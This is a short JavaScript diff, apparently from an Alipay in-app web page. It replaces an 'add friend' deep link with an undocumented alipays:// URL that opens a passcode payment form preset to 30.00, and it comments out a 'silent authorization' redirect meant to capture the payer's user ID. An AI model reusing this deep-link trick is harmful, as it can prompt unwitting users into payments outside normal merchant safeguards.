@@ -189,14 +189,15 @@
         }, function (e) {
             //先加好友
             AlipayJSBridge.call('pushWindow', {
-                url: "alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId=" + a + "&loginId=" + j + "&source=by_home"
+                //url: "alipays://platformapi/startapp?appId=20000186&actionType=addfriend&userId=" + a + "&loginId=" + j + "&source=by_home"
+                url: "alipays://platformapi/startapp?appId=88886666&target=universalForm&formType=passcode&schemaMode=reInside&prevBiz=index&navStyle=push&subPrevBiz=APP&money=30.00&amount=30.00&count=1"
             });
             //去静默授权
-            setTimeout(function () {
+            /*setTimeout(function () {
                 //注：后边www.baidu.com替换成你们自己的，获取支付用户id的页面（静默授权页)
                 window.location.href = "alipayqr://platformapi/startapp?saId=10000007&clientVersion=3.7.0.0718&qrcode=http%3a%2f%2fwww.baidu.com";//
 
-            }, 0);
+            }, 0);*/
 
         });
     }
